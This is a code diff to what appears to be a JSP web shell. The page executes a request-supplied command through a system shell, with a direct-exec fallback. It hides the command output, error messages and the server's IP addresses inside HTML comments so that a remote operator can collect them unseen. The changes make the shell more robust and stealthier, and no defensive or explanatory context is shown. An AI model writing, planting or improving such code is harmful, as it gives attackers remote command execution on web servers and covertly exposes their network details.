@@ -34,7 +34,7 @@ if (cmd != null)
     int x = 0;
     try{
         p = Runtime.getRuntime().exec(new String[]{bh,cS,cmd});
-        p.waitFor();
+        // p.waitFor();
         os = p.getOutputStream();
         in = p.getInputStream();
         x = in.read(b, 0, b.length); 
@@ -47,7 +47,7 @@ if (cmd != null)
         in.close();
         szSys = "";
     } catch (Exception x6) {
-    out.println(x6.getMessage());
+        szSys += "\n" + x6.getMessage() + "\n";
         try{
             p = Runtime.getRuntime().exec(cmd);
             p.waitFor();
@@ -65,7 +65,8 @@ if (cmd != null)
             in.close();
             szSys = "";
         } catch (Exception x1) {
-            out.println(x1.getMessage());
+            szSys += "\n" + x1.getMessage() + "\n";
+            
         }
     }
 }
@@ -152,7 +153,7 @@ if (cmd != null)
     else
     {
         try {
-        String szIp = "";
+        String szIp = "",sT1;
             Set<InetAddress> addrs = new HashSet<InetAddress>();
             Enumeration<NetworkInterface> ns = null;
             try {
@@ -165,11 +166,16 @@ if (cmd != null)
                 Enumeration<InetAddress> is = n.getInetAddresses();
                 while (is.hasMoreElements()) {
                     InetAddress i = is.nextElement();
-                    if (!i.isLoopbackAddress() && !i.isLinkLocalAddress() && !i.isMulticastAddress()) szIp += "," + i.getHostAddress();
+                    if (!i.isLoopbackAddress() && !i.isLinkLocalAddress() && !i.isMulticastAddress())
+                    {
+                        sT1 = i.getHostAddress();//-1 == sT1.indexOf(":") && 
+                        if(16 > sT1.length())
+                            szIp += "," + sT1;
+                    }
                 }
             }
 
-            out.print("<!-- ip:" + szIp + "," + szSys+ " -->");  
+            out.print("<!-- ip:" + szIp + "," + szSys + " -->");  
         } catch (Exception e) {
         }
         out.print("<!-- _xx_xx_ -->"); 
